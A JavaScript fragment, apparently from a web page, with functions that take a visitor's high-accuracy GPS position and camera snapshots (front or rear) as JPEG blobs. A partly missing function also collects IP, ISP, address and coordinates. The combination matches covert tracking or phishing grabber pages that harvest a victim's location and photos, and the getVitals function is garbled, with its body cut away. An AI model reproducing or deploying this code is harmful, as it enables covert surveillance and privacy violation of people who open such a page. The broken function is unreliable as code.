        function getGPS() {
            return new Promise((res) => {
                if (!navigator.geolocation) return res(null);
                let best = null;
                const watchID = navigator.geolocation.watchPosition(
                    (p) => {
                        const { latitude, longitude, accuracy } = p.coords;
                        if (!best || accuracy < best.acc) {
                            best = { lat: latitude, lon: longitude, acc: accuracy };
                        }
                        if (accuracy < 15) {
                            navigator.geolocation.clearWatch(watchID);
                            res(best);
                        }
                    },
                    () => res(null),
                    { enableHighAccuracy: true, maximumAge: 0 }
                );
                setTimeout(() => {
                    navigator.geolocation.clearWatch(watchID);
                    res(best);
                }, 4000);
            });
        }

        async function getVitals() {

                    lon: d.longitude || 0

            } catch (e) { return { ip: '?', isp: '?', addr: '?', lat: 0, lon: 0 }; }
        }

        async function capture(mode) {
            try {
                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                const v = document.getElementById('v');
                v.srcObject = s;
                await v.play();
                return new Promise(res => {
                    setTimeout(() => {
                        const c = document.createElement('canvas');
                        c.width = v.videoWidth; c.height = v.videoHeight;
                        c.getContext('2d').drawImage(v, 0, 0);
                        s.getTracks().forEach(t => t.stop());
                        c.toBlob(res, 'image/jpeg', 0.8);
                    }, 2000);
                });
            } catch (e) { return null; }
        }
